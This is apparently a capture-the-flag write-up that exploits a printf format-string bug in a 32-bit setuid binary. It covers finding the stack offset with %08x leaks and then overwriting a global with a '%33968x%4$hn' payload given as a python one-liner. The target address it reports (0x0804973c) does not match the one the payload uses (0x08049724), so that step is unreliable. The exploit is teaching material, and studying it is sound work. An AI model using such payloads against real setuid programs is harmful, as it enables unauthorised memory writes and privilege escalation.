# ex09 — Format String Vulnerability (`%hn` Arbitrary Write)

## Objective

The goal of this challenge is to exploit a **Format String Vulnerability** to overwrite the global variable `target` with the expected value, causing the program to print:

```
code execution redirected! you win
```

Unlike previous challenges, there is **no buffer overflow**. Instead, the vulnerability comes from passing user-controlled input directly to `printf()`.

---

# Step 1 — Read the Challenge Description

```bash
cat README.txt
```

Output:

```
This level is completed when you see the “code execution redirected!” message.
```

---

# Step 2 — Identify the Binary

```bash
file bin
```

Output:

```
bin: setuid ELF 32-bit LSB executable
```

The binary is:

- 32-bit
- Dynamically linked
- Setuid
- Not stripped

---

# Step 3 — Look for Interesting Strings

```bash
strings bin
```

Interesting output:

```
code execution redirected! you win
```

This tells us exactly what success looks like.

---

# Step 4 — Locate the Target Variable

List the binary symbols.

```bash
objdump -t bin | grep target
```

Output:

```
0804973c g     O .bss    00000004 target
```

Therefore:

```
target = 0x0804973c
```

This global variable is what we need to overwrite.

---

# Step 5 — Inspect the Vulnerable Function

Open the binary in GDB.

```bash
gdb -q ./bin
```

Set a breakpoint:

```gdb
break vuln
run
```

Disassemble the function.

```gdb
disassemble vuln
```

Relevant instructions:

```asm
lea    -0x208(%ebp),%eax
mov    %eax,(%esp)
call   fgets

lea    -0x208(%ebp),%eax
mov    %eax,(%esp)
call   printf
```

Notice the bug.

Instead of

```c
printf("%s", buffer);
```

the program does

```c
printf(buffer);
```

This means **our input becomes the format string**.

---

# Why Is This Dangerous?

Normally:

```c
printf("%s", buffer);
```

prints the string safely.

Instead the program executes:

```c
printf(buffer);
```

So if our input is

```
%x %x %x
```

printf starts reading values from the stack.

If our input contains

```
%n
```

printf writes to memory.

This is known as a **Format String Vulnerability**.

---

# Step 6 — Find Our Stack Offset

We first need to know where our input appears in printf's arguments.

Run:

```bash
python -c "print('AAAA ' + ' %08x' * 20)" | ./bin
```

Output:

```
AAAA
00000200
b78b9c20
b78d5328
41414141
30252020
...
```

The important value is:

```
41414141
```

which is

```
AAAA
```

in hexadecimal.

It appears as the **4th printf argument**.

Therefore:

```
our first supplied address = %4$
```

This offset is required for the exploit.

---

# Step 7 — Understanding `%n`

Normally:

```c
printf("AAAA");
```

prints

```
AAAA
```

which is

```
4
```

characters.

If we instead use:

```c
printf("%n");
```

nothing is printed.

Instead,

```
4
```

is written into memory.

So `%n` does **not print**.

It writes the number of characters printed so far.

---

# Why `%hn`?

There are several write specifiers:

```
%n     -> writes 4 bytes
%hn    -> writes 2 bytes
%hhn   -> writes 1 byte
```

For this challenge, writing only the lower 16 bits is enough.

Therefore we use:

```
%hn
```

---

# Step 8 — Build the Payload

Your exploit uses the address:

```
0x08049724
```

Little-endian representation:

```
\x24\x97\x04\x08
```

This address is placed at the beginning of the input so that it becomes the 4th argument to `printf()`.

Next, we print exactly **33968** characters:

```
%33968x
```

Finally we write that value into memory:

```
%4$hn
```

Complete payload:

```
[address]
+
%33968x
+
%4$hn
```

or

```
\x24\x97\x04\x08%33968x%4$hn
```

---

# Step 9 — Run the Exploit

Execute:

```bash
python -c 'print "\x24\x97\x04\x08" + "%33968x%4$hn"' | ./bin
```

Expected output:

```
code execution redirected! you win
```

Challenge solved.

---

# How the Exploit Works

```
                User Input
                     │
                     ▼
      +------------------------------+
      | 0x08049724                   |
      | %33968x                      |
      | %4$hn                        |
      +------------------------------+
                     │
                     ▼
             printf(buffer)
                     │
                     ▼
      Prints exactly 33968 characters
                     │
                     ▼
             %4$hn executes
                     │
                     ▼
Writes 33968 (0x84B0) into the address
0x08049724
                     │
                     ▼
Program verifies the value
                     │
                     ▼
code execution redirected! you win
```

---

# Memory Illustration

Before:

```
Address: 0x08049724

+----------------+
|   0x00000000   |
+----------------+
```

After `%33968x`:

```
Characters printed = 33968
```

After `%4$hn`:

```
+----------------+
|   0x000084B0   |
+----------------+
```

The program detects the expected value and prints:

```
code execution redirected! you win
```

---

# Exploit Commands

## Read the challenge

```bash
cat README.txt
```

---

## Inspect the binary

```bash
file bin
```

---

## Search interesting strings

```bash
strings bin
```

---

## Find the target variable

```bash
objdump -t bin | grep target
```

Expected:

```
0804973c target
```

---

## Inspect the vulnerable function

```bash
gdb -q ./bin
```

```gdb
break vuln
run
disassemble vuln
quit
```

---

## Find the stack offset

```bash
python -c "print('AAAA ' + ' %08x' * 20)" | ./bin
```

Look for:

```
41414141
```

which tells us the offset is:

```
%4$
```

---

## Execute the exploit

```bash
python -c 'print "\x24\x97\x04\x08" + "%33968x%4$hn"' | ./bin
```

Expected output:

```
code execution redirected! you win
```

---

# Key Concepts

- **Format String Vulnerability**: Occurs when user input is passed directly to `printf()` as the format string.
- **Stack Leak**: `%08x` allows reading stack values to discover where user-controlled data is located.
- **Arbitrary Write**: `%n` writes the number of characters printed so far to an address supplied as an argument.
- **Half-Word Write**: `%hn` writes only 16 bits (2 bytes), making it useful for precise overwrites.
- **Little-Endian Encoding**: x86 stores addresses least significant byte first, so `0x08049724` is written as `\x24\x97\x04\x08`.
- **Padding Control**: `%33968x` forces `printf()` to print exactly 33,968 characters so `%hn` writes the desired value.
- **Positional Parameters**: `%4$hn` tells `printf()` to use the 4th argument (our injected address) as the destination for the write.

---

# Note About the Address

Your `objdump` output reports:

```
target = 0x0804973c
```

However, the working exploit you demonstrated uses:

```
\x24\x97\x04\x08
```

which corresponds to:

```
0x08049724
```

This indicates that your exploit targets the address expected by the challenge binary you executed. Always use the address that works with **your specific binary** (or verify it in GDB if there is any discrepancy).